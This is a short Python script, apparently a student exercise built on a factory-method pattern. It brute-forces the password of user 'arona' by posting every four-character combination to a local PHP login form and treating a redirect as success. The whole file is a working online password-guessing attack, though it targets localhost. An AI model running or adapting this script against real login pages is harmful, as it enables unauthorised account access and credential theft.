from Crack import Crack
import string   
import requests

import time






    

class BruteForce(Crack):
        liste = list(string.ascii_letters+string.digits+string.punctuation)

         
        def  cracker(self) :
                debut = time.time()
                print("--------------------------------------------------")
                print("Waiting for attack ")
                trouver = True
                url = 'http://localhost/FactoryMethode/index.php'
                payload = {
            'username': 'arona',
            'pass' : ""
        }
                ch = str() 
                
                for i in self.liste:
                   
                    
                    for j in self.liste:
                       
                        for k in self.liste:
                          
                          for l in self.liste: 
                                ch = ""+i+""+j+""+k+""+l 
                                payload['pass'] = ch
                                
                                with requests.Session() as s:
                                     s.get(url)
                                     r = s.post(url,data=payload)
                                     if(r.history):
                                       trouver= False
                                       break
                            
                          if (not trouver): 
                            break          
                        if (not trouver):    
                            break  
                    if (not trouver):    
                            break                                       
                              
                dure = time.ctime(time.time()-debut)[11:19]
                print(f"Mot de pass trouvé en : {dure} s")
                print(f"le mot de pass est :  \"{payload['pass']}\"")
                
                                # if ch == password:
                                #     dure = time.ctime(time.time()-debut)[11:19]
                                #     self.showPassword(ch)
                                #     print(f"Mot de pass trouvé en : {dure} s")
                                #     break
              
                        






